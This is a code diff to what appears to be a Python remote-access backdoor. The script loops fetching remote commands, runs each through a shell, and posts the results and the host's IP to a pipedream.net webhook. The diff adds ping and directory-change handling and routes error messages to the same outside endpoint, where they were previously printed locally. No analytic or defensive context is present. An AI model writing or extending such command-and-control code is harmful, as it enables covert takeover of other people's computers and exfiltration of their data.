@@ -2,6 +2,7 @@ try:
     from requests import get, post
     from time import sleep
     from subprocess import check_output as system
+    from os import chdir
 
     old_command = ""
     command = ""
@@ -25,11 +26,32 @@ while True:
             post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)")
             continue
         except:
-            print("Failed to connect to server")
+            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
             continue
             # execute command
         if old_command != command:
             try:
+                if "ping" in command:
+                    try:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
+                    except KeyboardInterrupt:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when replying to ping")
+                    except:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
+                        continue
+                if "cd" in command:
+                    dir=command.replace('cd', '')
+                    try:
+                        chdir(dir)
+                    except KeyboardInterrupt:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) while changing directory")
+                        continue
+                    except FileNotFoundError:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: cd: No Such Directory")
+                    except:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
+                        continue
+
                 cmdout = system(command, shell=True)
                 if cmdout != "":
                     try:
@@ -38,7 +60,7 @@ while True:
                         post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when trying to post output")
                         continue
                     except:
-                        print("Failed to sent output")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to sent output")
                         continue
                 old_command = command
                 continue
